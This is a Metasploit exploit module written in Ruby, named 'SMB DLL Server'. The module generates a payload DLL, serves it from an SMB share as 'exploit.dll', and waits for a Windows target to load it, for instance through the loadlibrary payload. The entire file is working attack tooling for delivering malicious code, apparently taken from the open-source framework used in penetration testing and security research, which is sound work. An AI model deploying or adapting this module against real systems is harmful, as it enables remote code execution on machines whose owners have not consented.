##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# This is an example implementation of using the 
# Msf::Exploit::Remote::SMBFileServer module
# to serve an arbitrary DLL over SMB

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  include Msf::Exploit::Remote::SMB::Server::Share
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'SMB DLL Server',
      'Description'   => %q{
        This is an example implementation of using the SMBFileServer module
        to serve an arbitrary DLL over SMB.
        This module will sit around waiting for a DLL to be loaded,
        for instance by the "payload/windows/loadlibrary" module.
      },
      'Author'      => [
        'Matthew Hall <hallm@sec-1.com>',
      ],
      'DisclosureDate' => 'Mar 05 2014',
      'Platform'       => 'win',
      'Privileged'     => true,
      'Arch'         => ARCH_X86,
      'References'     =>
        [
          [ 'URL', 'http://www.sec-1.com/blog/'],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Privileged'     => true,
      'Platform'       => [ 'win'],
      'Targets'        =>
        [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
        ],
      'DefaultTarget'  => 0, # Default target is 32-bit 
      ))
      register_options(
        [
          OptString.new('FILE_NAME', [ false, 'DLL File name to share', 'exploit.dll'])
        ], self.class)
      deregister_options('FILE_CONTENTS')
  end

  def primer 
    self.exe_contents = generate_payload_dll
    print_status("File available on #{unc}...")
  end

end
